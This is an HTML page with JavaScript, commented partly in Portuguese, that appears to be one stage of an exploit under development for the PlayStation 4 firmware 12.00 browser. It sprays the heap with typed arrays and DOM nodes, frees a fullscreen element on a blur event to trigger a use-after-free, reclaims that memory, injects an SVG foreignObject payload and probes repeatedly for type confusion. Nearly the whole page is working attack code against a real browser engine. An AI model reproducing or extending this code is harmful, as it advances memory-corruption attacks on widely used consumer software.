<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF SVG Confusion Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → SVG foreignObject → Type Confusion</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG (alert)
let logBuffer = [];
function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP
function setupHeap() {
    let arr = [];
    for(let i=0;i<5000;i++){
        let a = new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (inalterado)
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style, {
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (ALINHADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    // churn
    for(let i=0;i<2000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // DOM spray
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }

    // 🔥 ArrayBuffer alinhado
    let ab=[];
    for(let i=0;i<8000;i++){
        let b=new ArrayBuffer(0x40);
        let v=new Uint8Array(b);
        v[0]=0x41;
        v[1]=0x42;
        v[2]=0x43;
        v[3]=0x44;
        ab.push(v);
    }
}

// ==========================
// 💥 SVG CONFUSION PAYLOAD
function injectSVG(child){
    try{
        child.outerHTML = `
        <svg id="pwn">
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml" id="inner">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] SVG payload injected");
    }catch(e){
        log("[UAF] outerHTML crash");
    }
}

// ==========================
// 🔬 TYPE CONFUSION PROBE
function probe(fsTarget){
    log("---- PROBE ----");

    try{
        let n = fsTarget.firstChild;

        log("[CHECK] node = " + n);
        if(!n) return;

        log("[CHECK] tag = " + n.tagName);
        log("[CHECK] nodeType = " + n.nodeType);

        // instanceof checks
        try { log("[CHECK] HTMLElement = " + (n instanceof HTMLElement)); } catch(e){}
        try { log("[CHECK] SVGElement = " + (n instanceof SVGElement)); } catch(e){}

        // 🔥 querySelector cross-namespace
        let inner=null;
        try{
            inner = n.querySelector("#inner");
            log("[CHECK] querySelector inner = " + inner);
        }catch(e){
            log("[UAF] querySelector crash");
        }

        // 🔥 inconsistência crítica
        if(inner){
            try{
                log("[CHECK] inner tag = " + inner.tagName);

                inner.innerHTML = "BBBB";
                log("[CHECK] inner write OK");

            }catch(e){
                log("[UAF] inner write crash");
            }
        } else {
            log("[!!!] INNER NÃO ENCONTRADO (INCONSISTENTE)");
        }

        // 🔥 layout engine touch
        try{
            let r = n.getBoundingClientRect();
            log("[CHECK] rect OK");
        }catch(e){
            log("[UAF] rect crash");
        }

        // 🔥 clone (muito sensível a UAF)
        try{
            let c = n.cloneNode(true);
            log("[CHECK] clone OK: " + c);
        }catch(e){
            log("[UAF] clone crash");
        }

    }catch(e){
        log("[UAF] probe crash geral");
    }

    try { log("[CHECK] parent = " + fsTarget.parentNode); } catch(e){}
}

// ==========================
// TRIGGER (INTACTO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }
    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    // 🔥 injeção no timing crítico
    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) injectSVG(child);
        }catch(e){}
    }, 30);

    // probes múltiplos
    setTimeout(()=>probe(fsTarget), 80);
    setTimeout(()=>probe(fsTarget), 160);
    setTimeout(()=>probe(fsTarget), 240);

    // log final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ NÃO ALTERAR
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste");

    let heap = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
